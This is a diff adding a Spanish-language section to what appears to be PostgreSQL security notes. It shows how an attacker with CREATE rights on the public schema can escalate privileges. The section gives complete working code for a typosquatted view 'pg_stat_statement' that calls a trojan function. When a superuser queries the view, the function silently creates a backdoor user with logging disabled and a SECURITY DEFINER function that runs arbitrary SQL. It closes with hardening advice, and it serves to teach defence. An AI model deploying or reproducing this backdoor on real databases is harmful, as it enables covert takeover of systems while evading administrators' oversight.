@@ -719,3 +719,125 @@ SELECT lpad( (RIGHT(num, 4)) ,  LENGTH(num) ,'*') AS ultimos_cuatro_digitos  fro
 ```
 
 
+
+
+
+## Ejemplo de Cómo un Atacante Puede Exploitar el Permiso CREATE en el Esquema Público del Rol Public
+ 
+```SQL
+Nota: No es posible modificar ningún objeto a menos que seas el propietario del mismo o un superusuario. Por lo tanto, la técnica de crear objetos como índices, reglas, triggers, casts, tipos, etc., y agregarles funciones como parámetros para que un administrador los ejecute con el fin de escalar privilegios, no es viable. Si esto fuera posible, un atacante podría crear una función maliciosa, agregarla a un objeto como un índice de una tabla muy utilizada y pasar la función maliciosa como parámetro en el índice. Esto permitiría al atacante ejecutar código malicioso sin ser detectado.
+
+Vista Engañosa: Puedes crear una vista, por ejemplo, llamada pg_stat_statement, que puede engañar al administrador de la base de datos. Este truco funciona si el administrador utiliza la tecla de tabulación para autocompletar los nombres de las tablas, ya que la tabla original es pg_stat_statements. La autocompletación sugerirá la tabla sin la "s" final, lo que podría llevar al administrador a ejecutar una función con código malicioso.
+
+Este código malicioso podría crear una función diseñada para ejecutar comandos con privilegios de administrador. Un atacante podría aprovechar esta vulnerabilidad, y el administrador no se daría cuenta del engaño. Además, es posible crear un usuario con parámetros específicos para evitar el registro de logs, aumentando así la dificultad de detectar la intrusión.
+
+Función Entendible: En este ejemplo, se creó la función entendible, a la cual se le pueden agregar más características. Por ejemplo, es posible crear un usuario sin caracteres visibles y ofuscar el código en Base64 que se ejecuta con EXECUTE. De esta manera, se puede pasar desapercibido para los administradores de la base de datos.
+
+
+
+----- Código de la Función:
+
+CREATE or replace FUNCTION get_oid(p_oid oid) RETURNS oid AS $_$
+BEGIN
+	
+	 
+	BEGIN
+ 
+    IF (SELECT 1 FROM pg_roles WHERE rolname = 'user_evil') IS NULL THEN
+        EXECUTE $$
+			create user user_evil WITH  password '123123';
+			ALTER user user_evil SET client_min_messages='notice';  
+			ALTER user user_evil SET  log_statement='none'; 
+			ALTER user user_evil SET log_min_messages='panic';
+			ALTER user user_evil SET log_min_error_statement='panic';
+			ALTER user user_evil SET log_duration = off; 
+			$$;
+
+    END IF;
+	
+	IF (select 1 from pg_roles where rolsuper = true and rolname = session_user) THEN
+	
+		IF (select 1 from pg_proc where proname ='polygons') IS NULL THEN
+
+			EXECUTE E'
+						
+				CREATE OR REPLACE FUNCTION polygons(p_value text) RETURNS void AS \$\$
+				BEGIN
+					EXECUTE p_value;
+				END;
+				\$\$ LANGUAGE plpgsql 
+				SECURITY DEFINER;
+
+				GRANT EXECUTE ON FUNCTION polygons(text) TO user_evil;
+
+			';
+	
+		END IF; 
+	
+	
+	END IF;
+	
+	
+	EXCEPTION 
+		WHEN OTHERS  THEN 
+
+	END;
+	
+	return p_oid ; 
+	
+END; $_$ LANGUAGE plpgsql  ;
+
+
+
+
+------- Código de la Vista:
+
+CREATE OR REPLACE VIEW public.pg_stat_statement AS
+SELECT 
+ get_oid(pg_stat_statements.userid) as userid,
+ pg_stat_statements.dbid,
+ pg_stat_statements.queryid,
+ pg_stat_statements.query,
+ pg_stat_statements.calls,
+ pg_stat_statements.total_time,
+ pg_stat_statements.min_time,
+ pg_stat_statements.max_time,
+ pg_stat_statements.mean_time,
+ pg_stat_statements.stddev_time,
+ pg_stat_statements.rows,
+ pg_stat_statements.shared_blks_hit,
+ pg_stat_statements.shared_blks_read,
+ pg_stat_statements.shared_blks_dirtied,
+ pg_stat_statements.shared_blks_written,
+ pg_stat_statements.local_blks_hit,
+ pg_stat_statements.local_blks_read,
+ pg_stat_statements.local_blks_dirtied,
+ pg_stat_statements.local_blks_written,
+ pg_stat_statements.temp_blks_read,
+ pg_stat_statements.temp_blks_written,
+ pg_stat_statements.blk_read_time,
+ pg_stat_statements.blk_write_time
+FROM pg_stat_statements(true) pg_stat_statements(userid, dbid, queryid, query, calls, total_time, min_time, max_time, mean_time,
+ stddev_time, rows, shared_blks_hit, shared_blks_read, shared_blks_dirtied, shared_blks_written, local_blks_hit, local_blks_read, local_blks_dirtied, local_blks_written, temp_blks_read, temp_blks_written, blk_read_time, blk_write_time); 
+
+
+
+----- Consultas para Comprobar el Usuario y la Función:
+
+SELECT * FROM public.pg_stat_statement LIMIT 1;
+SELECT usename, useconfig FROM pg_shadow WHERE usename = 'user_evil';
+\du user_evil
+\df polygons
+
+
+
+--------- Recomendaciones Adicionales:
+Revocar el Permiso CREATE en el Esquema public del Rol public: Esta acción ayudará a fortalecer la seguridad de tu base de datos al evitar que usuarios no autorizados creen objetos en el esquema público.
+
+Monitoreo y Registro: Implementa un sistema de monitoreo y registro para rastrear todas las actividades de los usuarios en la base de datos. Esto puede ayudar a identificar acciones sospechosas y responder rápidamente a posibles ataques.
+
+Capacitación en Seguridad: Proporciona capacitación en seguridad para todos los administradores y desarrolladores de la base de datos. Asegúrate de que estén al tanto de las mejores prácticas y de las técnicas de ataque comunes.
+
+Actualizar y Parchear: Mantén el sistema de gestión de bases de datos actualizado con los últimos parches de seguridad y versiones. Las actualizaciones a menudo incluyen correcciones para vulnerabilidades conocidas.
+
+```
